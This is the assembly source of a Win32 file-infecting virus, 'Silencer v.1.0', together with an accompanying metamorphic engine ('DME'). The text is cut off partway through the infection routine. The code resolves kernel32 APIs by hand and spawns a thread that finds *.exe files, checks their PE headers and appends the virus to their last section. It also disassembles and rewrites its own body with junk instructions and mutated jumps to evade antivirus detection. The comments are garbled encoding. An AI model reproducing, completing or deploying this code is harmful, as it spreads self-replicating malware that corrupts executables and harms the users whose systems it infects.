   ; Silencer v.1.0
   ; Using DME v.002b

   .386p
   .model  flat,stdcall

   ;-----------------------------------------------------------------------------
   .code
   extrn   MessageBoxA:proc
   extrn   ExitProcess:proc

   Msg db  'Test complete.',0

   Host:   Call    MessageBoxA,0,offset Msg,offset Msg,0
       Call    ExitProcess,0
   ;-----------------------------------------------------------------------------
   .data
   VEntry: Call    GetEbp
   GetEbp: pop ebp
       sub ebp,5
       mov eax,offset VEntry
       sub ebp,eax

       mov eax,[OldHost][ebp]
       push    eax

       Call    InitApi

       lea eax,[InfectDir][ebp]
       lea ebx,[Tid][ebp]
       Call    [CreateThread][ebp],0,128000,eax,ebp,0,ebx

   ;   Call    InfectDir
       ret
   jquit:  pop eax
       ret

   OldHost dd  offset Host

   Tid dd  0

   include stuff.inc
   include api.inc
   include infect.inc
   include DME.inc

   VTbl    dd  offset VEntry
       dd  offset InfectDir
   include     dme.tbl
   VTbll   equ ($-VTbl-1) shr 2
   VLen:
   include virdata.inc
   include data.inc
   FLen:
       nop
       nop
   buff    db  (FLen-VEntry)*4 dup (0)
   include win32.inc
       nop
   end VEntry

   --[ stuff.inc ]----------------------------------------------------------------

   InitApi proc
           Call    ApiInit

       xchg    eax,edx
       lea esi,[nf1][ebp]
       lea edi,[CreateFile][ebp]       ; ?ÿ§ð-ÿ?¿ ð¿ôR ¢ð R÷ÿ¢¬
       mov ecx,imnum           ; -£³-«? -ÿ¿ ¤£-ò¦ðð
   Import: push    ecx
       push    edi
       mov edi,esi
       mov al,0
   f0: scasb
       jnz f0
       mov edx,edi             ; ?ÿ¡§ð¢ÿ?¿ ý<ð-£
       sub edx,esi
       dec edx
       dec edx
       xchg    edi,esi
       push    esi
       Call    ImportApi           ; ?¿ôR ¢ð £?¿
       pop esi
       pop edi
       or  eax,eax
       pop ecx
       jz  jquit
       stosd
       loop    Import              ; ? RýR<³ÿ?¿
           ret
   InitApi endp

   nf1:    db  'CreateFileA',0         ; ?¿ôR ¢
       db  'ReadFile',0
       db  'WriteFile',0
       db  'CloseHandle',0
       db  'FindFirstFileA',0
       db  'FindNextFileA',0
       db  'FindClose',0
       db  'SetFilePointer',0
       db  'CreateThread',0
       db  'ExitThread',0


   InfectDir   proc
       mov ebp,[esp][4]

       lea edx,[fmask][ebp]
       lea ecx,[VirFindData][ebp]
       Call    [FindFirstFile][ebp],edx,ecx    ; ?©?¿ ¤ÿc<
       inc eax
       jz  AllFounded          ; ??¢£ öR<¬¨?...
       dec eax
       mov [fhandle][ebp],eax
   ifile:  lea edx,[cFileName][ebp]
           Call    InfectFile
       mov edx,[fhandle][ebp]
       lea ecx,[VirFindData][ebp]
       Call    [FindNextFile][ebp],edx,ecx     ; '<?ý£®©ðc ¤ÿc<
       or  eax,eax
       jnz ifile
       mov edx,[fhandle][ebp]
       Call    [FindClose][ebp],edx
   AllFounded:
       Call    [ExitThread][ebp],0
       ret                 ; Needed !!
   InfectDir   endp

   fhandle         dd  0
   fmask   db  '*.exe',0

   --[ api.inc ]------------------------------------------------------------------

   ; ??¡òR<¬òR ô R¦?ý£  ôRð¡òÿ/ð¿ôR ¢ÿ kernel32 ô R¦?ý£ 
   ; Deviator//HAZARD

   k32 dd  0
   k32i    dd  0
   k32e    dd  0
   k32n    dd  0
   k32nn   dd  0
   obase   dd  0
   opos    dd  0
   xpos    dd  0

   ApiInit proc

       mov eax,fs:[0]          ; SEH
   findl:  cmp 4 ptr [eax],-1          ; ?R¡<?ý-ðc ?
       jz  last                ; "?£
       mov eax,[eax]
       jmp findl
   last:   mov edi,[eax][4]

   fn: dec edi
       mov ax,'ZM'             ; ?©?¿ MZ
   fndk:   cmp [edi],ax
       jz  mz
       dec edi
       jmp fndk
   mz: mov ebx,edi
       mov eax,[edi][3Ch]          ; ?? ?¿ ¡¿?©-ð? -ÿ PE header
       cmp eax,3000h           ; > 3000h ? (ô R¡¢R ÷ Win95
       jae fn              ; MZ ÷¡¢ ?§ÿ?¢¡¯ ÷ ¡ÿ¿R¿
       add ebx,eax             ; kernel32,ÿ ¿-? Rö<R¿ SEH
       cmp 4 ptr [ebx],'EP'        ; ®ÿ¢¬ ý<¯ ô ?ýR¢÷ ÿ©?-ð¯
       jnz fn              ; R¨ðöRò )
       mov eax,edi
       mov [k32][ebp],edi          ; Store Kernel32 ImageBase
       add edi,[ebx][54h]
       mov [k32i][ebp],edi         ; Store Kernel32 VA

       mov edx,[ebx][78h]
       add edx,eax
       mov [k32e][ebp],edx         ; Store Kernel32 Export table

       mov ecx,[edx][10h]          ; Ordinal Base
       mov [obase][ebp],ecx

       mov ecx,[edx][24h]          ; Ordinal RVA
       add ecx,eax
       mov [opos][ebp],ecx

       mov ecx,[edx][1Ch]
       add ecx,eax
       mov [xpos][ebp],ecx         ; Export table

       mov ecx,[edx][20h]
       add ecx,eax
       mov [k32n][ebp],ecx         ; Export names

       mov ecx,[edx][18h]
       mov [k32nn][ebp],ecx        ; Number of export names

       ret
   ApiInit endp

   ImportApi   proc            ; EDi - import name,EDX - Len of name
       mov esi,[k32n][ebp]     ; ? R¦?ý£ òÿ ð¿ôR ¢ÿ -£³-Rc ¤£-ò¦ðð
       mov ecx,[k32nn][ebp]
       xor ebx,ebx         ; ÷R÷ ÿ©ÿ?¢ ÷ EAX <ðöR 0,?¡<ð
   aFindIt:
       lodsd               ; -?¢ ¢ÿòRc ¤£-ò¦ðð ÷ ò¡ôR ¢?
       push    esi edi ecx     ; ð<ð ?? ÿý ?¡.
       add eax,[k32][ebp]
       xchg    eax,esi
       mov ecx,edx
   rep cmpsb
       pop ecx edi esi
       jz  ItsIt
       inc ebx
       loop    aFindIt
       xor eax,eax
       ret
   ItsIt:  inc ebx
       lea esi,[ebx*2]
       add esi,[opos][ebp]
       movzx   eax,2 ptr [esi]
       sub eax,[obase][ebp]
       shl eax,2
       add eax,[xpos][ebp]
       mov eax,[eax]
       add eax,[k32][ebp]
       ret
   ImportApi   endp

   --[ a.inc ]--------------------------------------------------------------------

   ; ?-ÿ<ðÿ¢R  òRýÿ. ? «?ÿ?¢ ôR Jumpÿ¿,  ?ò£ ¡ð÷-R Rö¥Rýð¢ CALL'«.
   ; 'Rýÿ?¢ òÿ ¢£ òRýÿ-ýÿ--«¥

   Analyse proc            ; ESi - Entry point
       Call    CheckBlock  ; ?« ¢£¢ £³? ö«<ð ? :¡<ð ýÿ - -ÿ ÷«¥Rý
       jnc XRet        ; ?-ÿ§? ö£ý?¿ ÷ð¡?¢¬ ¡  ?ò£ ¡ð?c ð ¦ðò<ÿ¿ð

       Call    GetSize32   ; ?ÿ¿?  òR¿¿ÿ-ý«
       push    eax
       Call    AddBlock    ; "Röÿ÷ð¿ ö<Rò òRýÿ

       Call    AddData     ; ? R÷? ð¿ -ÿ ýÿ--«?

       mov al,[esi]

       cmp al,0C3h     ; Ret ?
       jz  GRet

       cmp al,0EBh     ; Jmp short ?
       jz  aJmps

       cmp al,0E8h     ; Call near
       jz  aCalln

       cmp al,0E9h     ; Jmp near
       jz  aJmpn

       cmp al,070h     ; Jzz ?
       jb  t1
       cmp al,07Fh
       jbe cJmps

   t1: cmp al,0E0h     ; LOOPzz ?
       jb  t2
       cmp al,0E2h
       jbe cJmps

   t2: cmp al,0Fh      ; Extended Jzz ?
       jnz SkipJ

       mov al,[esi][1]

       cmp al,80h
       jb  SkipJ
       cmp al,8Fh
       jbe cJmpn

   SkipJ:  pop eax
       add esi,eax
       jmp Analyse
   GRet:   pop eax
   XRet:   ret
   Analyse endp

   aJmps:  pop eax
       Call    AddJump
       xor eax,eax
       lodsb
       lodsb
       cbw
       or  ax,ax
       jge NoIn2
       or  eax,0FFFF0000h
   NoIn2:  add esi,eax
       jmp Analyse

   cJmps:  pop eax
       Call    AddJump
       xor eax,eax
       lodsb
       lodsb
       cbw
       or  ax,ax
       jge NoIn3
       or  eax,0FFFF0000h
   NoIn3:  push    esi
       add esi,eax
       Call    Analyse
       pop esi
       jmp Analyse

   cJmpn:  pop eax
       Call    AddJump
       lodsw
       lodsd
       push    esi
       add esi,eax
       Call    Analyse
       pop esi
       jmp Analyse

   aJmpn:  pop eax
       Call    AddJump
       lodsb
       lodsd
       add esi,eax
       jmp Analyse

   aCalln: pop eax
       Call    AddJump
       lodsb
       lodsd
       push    esi
       add esi,eax
       Call    Analyse
       pop esi
       jmp Analyse

   --[ blocks.inc ]---------------------------------------------------------------

   ; ?ÿ<ð§-«? ô R¦?ý£ « ý<¯  ÿöR¢« ¡ ö<Ròÿ¿ð

   MaxBlocks   equ 1000

   AddBlock    proc        ; ESi - Position, EAX - Size to extend
       Call    CheckBlockAdd   ; ?R³-R ýRöÿ÷ð¢¬ £³? ò ¡£©?¡¢÷£®©?¿£ ö<Rò£ ?
       jc  CreateBlock ; ??ÿ... 'Rýÿýð¿ -R÷«c
       add [edx][4],eax    ; "÷?<ð§ð¿  ÿ¿?  ö<Ròÿ
       ret
   AddBlock    endp
   ;--------------------------------------------------
   CheckBlockAdd   proc        ; ? R÷? òÿ -ÿ ÷¥R³ý?-ð? ÿý ?¡ÿ ÷ ö<Rò
       push    esi ecx eax ; ¡ ÷R¿R³-R¡¢¬® ýRöÿ÷<?-ð¯ ÷ òR-?¦ ö<Ròÿ
       mov ebx,esi
       mov ecx,[BlockNum][ebp]
       or  ecx,ecx
       jz  BBlock
       lea esi,[Blocks][ebp]
   CheckIt:lodsd
       mov edx,eax
       lodsd
       add eax,edx
       cmp ebx,eax
       ja  NotHere
       cmp ebx,edx
       jae Here
   NotHere:loop    CheckIt
   BBlock: pop eax ecx esi
       stc
       ret
   Here:   lea edx,[esi-8]
       pop eax ecx esi
       clc
       ret
   CheckBlockAdd   endp

   CheckBlock  proc        ; ? R÷? òÿ -ÿ ÷¥R³ý?-ð? ÿý ?¡ÿ ÷ ö<Rò
       push    esi ecx eax
       mov ebx,esi
       mov ecx,[BlockNum][ebp]
       or  ecx,ecx
       jz  xBBlock
       lea esi,[Blocks][ebp]
   xCheckIt:
       lodsd
       mov edx,eax
       lodsd
       add eax,edx
       cmp ebx,eax
       jae xNotHere
       cmp ebx,edx
       jae xHere
   xNotHere:
       loop    xCheckIt
   xBBlock:
       pop eax ecx esi
       stc
       ret
   xHere:  lea edx,[esi-8]
       pop eax ecx esi
       clc
       ret
   CheckBlock  endp
   ;--------------------------------------------------
   CreateBlock proc            ; 'Rýÿ?¢ -R÷«c ö<Rò
       push    edi
       mov edi,[BlockNum][ebp]
       lea edi,[Blocks][edi*8][ebp]
       xchg    esi,eax
       stosd
       xchg    esi,eax
       stosd
       pop edi
       inc [BlockNum][ebp]
       ret
   CreateBlock endp
   ;--------------------------------------------------
   CheckBlocks proc
       mov [incheck][ebp],1
       push    esi edi
       mov ecx,[BlockNum][ebp]
       or  ecx,ecx
       jz  NoBlocks
       xor ecx,ecx
       lea edx,[Blocks][ebp]
   DoCheck:push    ecx
       lea esi,[edx][8]
   DoC2:   mov edi,[edx]
       add edi,[edx][4]
       mov ebx,[esi]
       add ebx,[esi][4]

       mov eax,[edx]
       cmp eax,[esi]
       jb  RightCheck
       cmp eax,ebx
       ja  xJoin
       Call    JoinBlocks
       jmp xJoin
   RightCheck:
       cmp edi,ebx
       ja  xJoin
       cmp edi,[esi]
       jb  xJoin
       Call    JoinBlocks
   xJoin:  add esi,8
       inc ecx
       cmp ecx,[BlockNum][ebp]
       jb  DoC2
       add edx,8
       pop ecx
       inc ecx
       cmp ecx,[BlockNum][ebp]
       jb  DoCheck

   NoBlocks:
       mov [incheck][ebp],0
       pop edi esi
       ret
   CheckBlocks endp
   ;--------------------------------------------------
   RemoveBlock proc            ; ESi = Block to delete...
       push    ecx esi edi
       mov edi,esi
       lea ecx,[Blocks][ebp]
       sub ecx,esi
       neg ecx
       shr ecx,3
       sub ecx,[BlockNum][ebp]
       neg ecx
       or  ecx,ecx
       jz  NoShr
   ;   cmp ecx,1
   ;   jz  NoShr
   ;   dec ecx
       shl ecx,1
       add esi,8
   rep movsd
   NoShr:  pop edi esi ecx
       dec [BlockNum][ebp]
       cmp [incheck][ebp],0
       jz  JRet
       sub esi,8
   JRet:   ret
   RemoveBlock endp
   ;--------------------------------------------------
   JoinBlocks  proc            ; EDX + ESi = EDX
       push    ecx
       mov ecx,[edx]
       add ecx,[edx][4]

       mov eax,[esi]
       add eax,[esi][4]

       cmp eax,ecx
       jb  LeaveEcx
       mov ecx,eax
   LeaveEcx:
       mov eax,[edx]
       cmp eax,[esi]
       jb  LeaveEax
       mov eax,[esi]
   LeaveEax:
       sub ecx,eax

       mov [edx],eax
       mov [edx][4],ecx
       Call    RemoveBlock
       pop ecx
       ret
   JoinBlocks  endp

   --[ Disasmer.inc ] -----------------------------------------------------------

   ; ??¿-R?R <ÿ¿? ¡òð, -R  ÿöR¢ÿ?¢...

   LowData db  ?
   LowType db  ?

   GetSize32   proc
       mov [LowData][ebp],0
       mov [LowType][ebp],0
       xor ebx,ebx
   SAgain: push    esi edi ecx
       lodsb
       lea edi,[OpTbl][ebp]
   FindIt: movzx   ecx,1 ptr [edi]
       or  ecx,ecx
       jz  BadOpcode
       inc edi
   repne   scasb
       jnz SkipBlock
       add edi,ecx
       mov eax,[edi]
       add eax,ebp
       Call    eax
       xchg    eax,ebx
       pop ecx edi esi
       ret
   SkipBlock:
       add edi,4
       jmp FindIt
   BadOpcode:
       pop ecx edi esi
       xor eax,eax
       ret
   GetSize32   endp

   GetSize16   proc
       mov [LowData][ebp],1
       inc ebx
       Call    SAgain
       xchg    eax,ebx
       mov [LowData][ebp],0
       ret
   GetSize16   endp
   ;-----------------------
   XData:  mov [LowType][ebp],1
       inc ebx
       Call    SAgain
       xchg    eax,ebx
       mov [LowType][ebp],0
       ret
   ;-----------------------
   Complex proc
       xor edx,edx
       add bl,2
       lodsb
       push    eax
       shr al,6
       cmp al,0
       jz  NoAdd
       cmp al,3
       jz  NoAdd
       inc edx

       inc ebx
       cmp al,2
       jnz NoAdd
       inc ebx
       cmp [LowData][ebp],1
       jz  NoAdd
       cmp [LowType][ebp],1
       jz  NoAdd
       inc ebx
       inc ebx
   NoAdd:  pop eax
       and al,11000111b
       cmp al,5
       jnz NotFour
       add ebx,4
   NotFour:and al,00000111b
       cmp al,4
       jnz NotAdd2
       cmp [LowData][ebp],1
       jz  NotAdd2
       inc ebx
       jmp Cplx2
   NotAdd2:ret
   Complex endp

   Cplx2   proc
       or  edx,edx
       jnz NotAdd4
       lodsb
       and al,00000111b
       cmp al,5
       jnz NotAdd4
       add ebx,4
   NotAdd4:ret
   Cplx2   endp

   Return7:inc ebx
   Return6:inc ebx
   Return5:inc ebx
   Return4:inc ebx
   Return3:inc ebx
   Return2:inc ebx
   Return1:inc ebx
       ret

   Complex1:
       Call    Complex
       inc ebx
       ret

   Complex2:
       Call    Complex
       add bl,2
       ret

   Complex4:
       Call    Complex2
       cmp [LowData][ebp],1
       jz  GoRet
       add bl,2
   GoRet:  ret

   Return3or5:
       cmp [LowData][ebp],1
       jnz Return5
       jmp Return3

   Return3or5addr:
       cmp [LowType][ebp],1
       jnz Return5
       jmp Return3

   Repzz:  inc ebx
       Call    SAgain
       xchg    eax,ebx
       ret
   ;----------------------------------------------
   Grp1:   lodsb
       dec esi
       and al,00111000b
       or  al,al
       jz  Complex1
       jmp Complex

   Grp2:   lodsb
       dec esi
       and al,00111000b
       or  al,al
       jz  Complex4
       jmp Complex

   uExtended:
       lodsb
       cmp al,0A3h
       jz  Complex1
       cmp al,0A4h
       jz  Complex2
       cmp al,0A5h
       jz  Complex1
       cmp al,0ABh
       jz  Complex1
       cmp al,0ACh
       jz  Complex2
       cmp al,0ADh
       jz  Complex1
       cmp al,0AFh
       jz  Complex1

       cmp al,3
       ja  S1
       cmp al,0
       jae Complex1

   S1: cmp al,0Fh
       ja  S2
       cmp al,5
       jae Return2

   S2: cmp al,26h
       ja  S3
       cmp al,20h
       jae Complex1

   S3: cmp al,4Fh
       ja  S4
       cmp al,40h
       jae Complex1

   S4: cmp al,8Fh
       ja  S5
       cmp al,80h
       jae Return6

   S5: cmp al,9Ah
       ja  S6
       cmp al,90h
       jae Complex1

   S6: cmp al,0A1h
       ja  S7
       cmp al,0A0h
       jae Return2

   S7: cmp al,0AAh
       ja  S8
       cmp al,0A8h
       jae Return2

   S8: cmp al,0C1h
       ja  S9
       cmp al,0B0h
       jae Complex1

   S9: jmp Complex1

   ;----------------------------------------------
   OpTbl   db  32
       db  00h,02h,10h,12h,20h,22h,30h,32h ; ADD,ADC,AND,XOR
       db  01h,03h,11h,13h,21h,23h,31h,33h ; OR ,SBB,SUB,CMP
       db  08h,0Ah,18h,1Ah,28h,2Ah,38h,3Ah
       db  09h,0Bh,19h,1Bh,29h,2Bh,39h,3Bh
       dd  offset Complex

       db  17              ; J??,Jmp Short
       db  70h,71h,72h,73h,74h,75h,76h,77h,78h,79h,7Ah,7Bh,7Ch,7Dh,7Eh,7Fh
       db  0EBh
       dd  offset Return2

       db  8               ; Mov Reg8,im8
       db  0B0h,0B1h,0B2h,0B3h,0B4h,0B5h,0B6h,0B7h
       dd  offset Return2

       db  8               ; Mov Reg16,im16
       db  0B8h,0B9h,0BAh,0BBh,0BCh,0BDh,0BEh,0BFh
       dd  offset Return3or5

       db  8               ; AND,ADC.... AL,im8
       db  04h,14h,24h,34h,0Ch,1Ch,2Ch,3Ch
       dd  offset Return2

       db  8
       db  05h,15h,25h,35h,0Dh,1Dh,2Dh,3Dh ; AND,ADC.... (E)AX,im16(32)
       dd  offset Return3or5

       db  16              ; INC/DEC Reg16(32)
       db  40h,41h,42h,43h,44h,45h,46h,47h,48h,49h,4Ah,4Bh,4Ch,4Dh,4Eh,4Fh
       dd  offset Return1

       db  8
       db  90h,91h,92h,93h,94h,95h,96h,97h ; NOP,XCHG (E)AX,Reg16(32)
       dd  offset Return1

       db  16              ; Push/Pop Reg16(32)
       db  50h,51h,52h,53h,54h,55h,56h,57h,58h,59h,5Ah,5Bh,5Ch,5Dh,5Eh,5Fh
       dd  offset Return1

       db  2
       db  60h,61h             ; Pusha/Popa
       dd  offset Return1

       db  1
       db  62h             ; Bound
       dd  offset Complex

       db  1
       db  66h             ; Extended Size
       dd  offset GetSize16

       db  1
       db  67h             ; Xtended data
       dd  offset XData

       db  2
       db  64h,65h             ; SegFS/GS
       dd  offset Repzz

       db  11
       db  06h,07h,16h,17h,27h,28h,0Eh,1Eh,1Fh,2Fh,3Fh
       dd  offset Return1

       db  4
       db  26h,36h,2Eh,3Eh
       dd  offset Repzz

       db  6
       db  0A0h,0A1h,0A2h,0A3h,0A8h,0A9h   ; MOV (E)AX,mem16(32)
       dd  offset Return3or5addr

       db  11              ; ???SB
       db  0A4h,0A5h,0A6h,0A7h,0AAh,0ABh,0ADh,0ACh,0ADh,0AEh,0AFh
       dd  offset Return1

       db  2
       db  0C3h,0CBh           ; RETN/RETF
       dd  offset Return1

       db  4
       db  0D4h,0D5h,0D7h,0CCh     ; AAM/AAD,etc
       dd  offset Return1

       db  2
       db  0C2h,0CAh           ; RETF/RETN im16
       dd  offset Return3

       db  2
       db  0C4h,0C5h           ; LES/LDS
       dd  offset Complex

       db  1
       db  0C6h                ; MOV mem,im8
       dd  offset Complex1

       db  1
       db  0C7h                ; MOV mem,imm16(32)
       dd  offset Complex4

       db  2
       db  0C0h,0C1h           ; SHL/ROL/ROR ...,im8
       dd  offset Complex1

       db  4
       db  0D0h,0D1h,0D2h,0D3h     ; SHL/.... ,1
       dd  offset Complex          ; SHL/.... ,CL

       db  4
       db  88h,89h,8Ah,8Bh         ; MOV r/m,im16,etc
       dd  offset Complex

       db  2
       db  8Ch,8Eh             ; MOV r/m,seg
       dd  offset Complex          ; MOV seg,r/m

       db  2
       db  8Fh,8Dh             ; POP r/m,LEA reg,r/m
       dd  offset Complex

       db  1
       db  68h             ; PUSH im16(32)
       dd  offset Return3or5

       db  1
       db  6Ah             ; PUSH im8
       dd  offset Return2

       db  1
       db  69h             ; imul r/m,im16(32)
       dd  offset Complex4

       db  1
       db  6Bh             ; imul r/m,im8
       dd  offset Complex1

       db  4
       db  6Ch,6Dh,6Eh,6Fh         ; insb/insw/outsb/outsw
       dd  offset Return1

       db  7
       db  98h,99h,9Bh,9Ch,9Dh,9Eh,9Fh ; cbw/.../lahf/...
       dd  offset Return1

       db  1
       db  0CDh                ; int im8
       dd  offset Return2

       db  3
       db  0C9h,0CEh,0CFh          ; leave/into/iret
       dd  offset Return1

       db  1
       db  0C8h
       dd  offset Return4          ; Enter im16,im8

       db  3
       db  80h,82h,83h         ; ArOp
       dd  offset Complex1

       db  4
       db  84h,85h,86h,87h         ; TEST/XCHG r8(16)(32),r/m
       dd  offset Complex

       db  1
       db  81h             ; ArOp r/m,r16(32)
       dd  offset Complex4

       db  4
       db  0E0h,0E1h,0E2h,0E3h     ; Loop??,jcxz
       dd  offset Return2

       db  4
       db  0E4h,0E5h,0E6h,0E7h     ; IN/OUT AL(AX)(EAX),port8
       dd  offset Return2

       db  2
       db  0E8h,0E9h           ; Jmp/Call Near
       dd  offset Return3or5

       db  1
       db  0EAh                ; Jmp Far
       dd  offset Return7

       db  4
       db  0ECh,0EDh,0EEh,0EFh     ; IN/OUT AL(AX)(EAX),DX
       dd  offset Return1

       db  3
       db  0F0h,0F4h,0F5h          ; Lock,Halt,CMC
       dd  offset Return1

       db  2
       db  0F2h,0F3h
       dd  offset Repzz

       db  6
       db  0F8h,0F9h,0FAh,0FBh,0FCh,0FDh   ; STC/...
       dd  offset Return1

       db  1
       db  0F6h
       dd  offset Grp1

       db  1
       db  0F7h
       dd  offset Grp2

       db  2
       db  0FEh,0FFh
       dd  offset Complex

       db  1
       db  0Fh
       dd  offset uExtended

       db  0

   --[ data.inc ]-----------------------------------------------------------------

   xSrc        dd  ?
   xDst        dd  ?
   xBase       dd  ?
   xAddOffset  dd  ?
   xPos        dd  ?

   incheck     db  ?
   RegMask     dd  ?

   NoGen       db  ?

   MaxMorph    dd  ?

   BlockNum    dd  ?
   Datan       dd  ?
   Jmpn        dd  ?
   Tbln        dd  ?

   Blocks      dd  2*MaxBlocks dup (0)

   Jumps       dd  2*MaxJumps  dup (0)

   Datas       dd  2*MaxData   dup (0)

   Tbls        dd  2*MaxTbls   dup (0)

   --[ Dme.inc ]-----------------------------------------------------------------

   ; Deviator Morphic Engine v.001beta

   ; Input
   ; ESi - Entry Point Src (with zero end)
   ; EDi - Dst
   ; EBX - ImageBase of code
   ; EDX - Offset to code
   ; ECX - Size of all code (including variables)
   ; EAX - Offset to some variable

   ; Output
   ; ECX - New Size
   ; EDi - is filled with permutated code
   ; EAX - New offset of variable

   DME proc
       add ecx,edx
       mov [MaxMorph][ebp],ecx         ; Max Size
       mov [xDst][ebp],edi
       mov [xBase][ebp],ebx
       mov [xSrc][ebp],edx
       mov [xAddOffset][ebp],eax

       xor eax,eax
       mov [incheck][ebp],al
       mov [Datan][ebp],eax
       mov [BlockNum][ebp],eax
       mov [Jmpn][ebp],eax
       mov [Tbln][ebp],eax
       mov [GarbLvl][ebp],al

       mov al,0FFh
       mov [RegMask][ebp],eax

   ;--------------------------------------------
       Call    UserProc_InitTables
   ;--------------------------------------------
   DoMorph:lodsd
       or  eax,eax
       jz  Morphed
       push    esi
       add eax,ebp
       xchg    eax,esi
       Call    Analyse
       Call    CheckBlocks
       pop esi
       jmp DoMorph
   Morphed:
       mov eax,[Jmpn][ebp]
       mov [G_Jxx][ebp],eax

       mov esi,[xSrc][ebp]
       mov edi,[xDst][ebp]
       Call    Morph
       push    ecx
       Call    PatchJumps
       Call    PatchData
   ;-------------------------------------------
       Call    PatchTblData
   ;-------------------------------------------
       pop ecx
       mov eax,[xAddOffset][ebp]
       ret
   DME endp

   include a.inc
   include blocks.inc
   include morph.inc
   include disasmer.inc
   include jumps.inc
   include pdata.inc
   include tables.inc
   include mutate.inc
   include garble.inc

   include user.inc

   --[ dme.tbl ]-----------------------------------------------------------------

   ; a.inc
   ;  none.
   ; api.inc
   ;  none.
   ; disasmer.inc
       dd  offset Complex
       dd  offset GetSize16
           dd      offset uExtended
           dd      offset XData
           dd      offset Return7
           dd      offset Return3or5
           dd      offset Return3or5addr
           dd      offset Repzz
           dd      offset Grp1
           dd      offset Grp2
           dd      offset Complex4
   ; pdata.inc
           dd      offset DataComplex
           dd      offset DataReturn1
       dd  offset xOpcode
   ; mutate.inc
       dd  offset Mut_ShortJmp
       dd  offset Mut_ShortJmp2
       dd  offset Mut_Loop
       dd  offset Mut_CheckZero
       dd  offset Mut_MovZero
       dd  offset Mut_Xchg
       dd  offset Mut_Inc
       dd  offset Mut_Dec
       dd  offset TryIncDec
   ; garbage.inc
       dd  offset SetMask
       dd  offset FreeMask
       dd  offset GetAnyReg
       dd  offset GetNotFreeReg
       dd  offset GetReg
       dd  offset CheckReg
       dd  offset GetRegNum

       dd  offset G_XchgEax
       dd  offset G_PushPop
       dd  offset G_Nop
       dd  offset G_MovRegImm
       dd  offset G_MovRegReg
       dd  offset G_GenJxx

           dd      0

   --[ Garble.inc ] -------------------------------------------------------------

   MaxGarb equ 2

   Last    dd  0

   DoGarble    proc
       cmp [GarbLvl][ebp],MaxGarb
       jae NoGarb
       inc [GarbLvl][ebp]
   WLast:  mov eax,GarbLen
       Call    Random
       cmp [Last][ebp],eax
       jz  WLast
       mov [Last][ebp],eax
       lea eax,[GarbTbl][ebp][eax*4]
       mov eax,[eax]
       add eax,ebp
       Call    eax
   NoGarb: ret
   DoGarble    endp
   ;--------------------
   Random  proc
       push    edx ecx eax
       mov eax,[randseed][ebp]
       rol eax,1
       add eax,7824F38Ch
       rol eax,1
       not eax
       neg eax
       mov [randseed][ebp],eax
       pop ecx
       or  ecx,ecx
       jz  NoDiv
       xor edx,edx
       div ecx
       xchg    eax,edx
   NoDiv:  pop ecx edx
       ret
   Random  endp

   randseed    dd  22312345h
   ;--------------------
   GetAnyReg   proc
       mov eax,8
       Call    Random
       cmp eax,4
       jz  GetAnyReg
       ret
   GetAnyReg   endp

   CheckReg    proc
       xchg    eax,ebx
       xor eax,eax
       mov al,bl
       bt  [RegMask][ebp],eax
       ret
   CheckReg    endp

   GetNotFreeReg   proc
       Call    GetRegNum
       or  eax,eax
       jz  GetAnyReg
       sub eax,8
       neg eax
       Call    Random
       inc eax
       xchg    eax,ecx
       xor ebx,ebx
       mov eax,[RegMask][ebp]
   GetF:   inc ebx
       shr al,1
       jnc GetF
       loop    GetF
       dec ebx
       xchg    eax,ebx
       ret
   GetNotFreeReg   endp

   GetReg  proc
       Call    GetRegNum
       or  eax,eax
       jz  NoReg
       Call    Random
       xchg    eax,ecx
       xor ebx,ebx
       mov eax,[RegMask][ebp]
   ChooseReg:
       inc ebx
       shr al,1
       jc  ChooseReg
       or  ecx,ecx
       jz  RetReg
       dec ecx
       jmp GetReg

   RetReg: dec ebx
       xchg    eax,ebx
       ret

   NoReg:  mov al,9
       ret
   GetReg  endp

   GetRegNum   proc
       mov eax,[RegMask][ebp]
       xor ebx,ebx
       not eax
   CheckN: cmp al,0
       jz  JJRet
       shr al,1
       jnc NoBit
       inc ebx
   NoBit:  jmp CheckN
   JJRet:  xchg    eax,ebx
       ret
   GetRegNum   endp

   FreeMask    proc
       btr [RegMask][ebp],eax
       ret
   FreeMask    endp

   SetMask proc
       bts [RegMask][ebp],eax
       ret
   SetMask endp
   ;--------------------
   GarbLvl db  0

   GarbTbl dd  offset G_XchgEax
       dd  offset G_PushPop
       dd  offset G_Nop
       dd  offset G_GenJxx

       dd  offset G_MovRegImm
       dd  offset G_MovRegReg
   GarbLen equ ($-GarbTbl) shr 2

   G_XchgEax:
       cmp [RegMask][ebp],0FFh
       jnz EaxUsed

   ;   xor eax,eax
   ;   Call    CheckReg
   ;   jnc EaxUsed
   ;   Call    GetNotFreeReg

       Call    GetAnyReg
       add al,90h
       push    eax
       stosb
       Call    DoGarble
       pop eax
       stosb
   EaxUsed:
       ret


   G_PushPop:
       Call    GetAnyReg
       push    eax
       Call    FreeMask

       add al,50h
       stosb

       Call    DoGarble

       pop eax
       Call    SetMask
       add al,58h
       stosb
       ret

   G_Nop:  mov al,90h
       stosb
       ret

   G_MovRegImm:
       Call    GetReg
       cmp al,9
       jz  bReg
       add al,0B8h
       stosb
       xor eax,eax
       Call    Random
       stosd
   bReg:   ret

   G_MovRegReg:
       Call    GetReg
       cmp al,9
       jz  bReg
       push    eax
       mov al,8Bh
       stosb
       pop eax
       shl al,3
       xchg    eax,ebx
       Call    GetAnyReg
       add al,bl
       add al,0C0h
       stosb
       ret

   G_Jxx   dd  0

   G_GenJxx:
       mov eax,[G_Jxx][ebp]
       cmp eax,MaxJumps
       jae NoJmpz

       mov al,0Fh
       stosb
       mov eax,16
       Call    Random
       add al,80h
       stosb
       push    edi
       stosd
       Call    DoGarble
       pop ebx
       mov eax,edi
       sub eax,ebx
       sub eax,4
       mov [ebx],eax
       inc [G_Jxx][ebp]
   NoJmpz:
       ret

   --[ Infect.inc ]---------------------------------------------------------------

   ; Infection appenging to last section

   InfectFile      proc
       Call    [CreateFile][ebp],edx,GENERIC_READ or GENERIC_WRITE,SHARE_READ,0,OPEN_EXISTING,0,0
       inc eax             ; ?ð¯ ?
       jz  nextone
       dec eax
       xchg    eax,ebx
       lea edx,[need][ebp]         ; -ð¢ÿ?¿ header
       push    edx
       lea ecx,[free][ebp]
       Call    [ReadFile][ebp],ebx,edx,40h,ecx,0
       pop edi
       mov ax,'ZM'
       scasw
       jnz CloseIt
       lea edi,[need][12h][ebp]
       mov ax,'DM'
       scasw
       jz  CloseIt

       mov eax,4 ptr [need][3Ch][ebp]
       mov [peh][ebp],eax
       Call    [FSeek][ebp],ebx,eax,0,0    ; -ÿ PE ÿ?R<R÷Rò
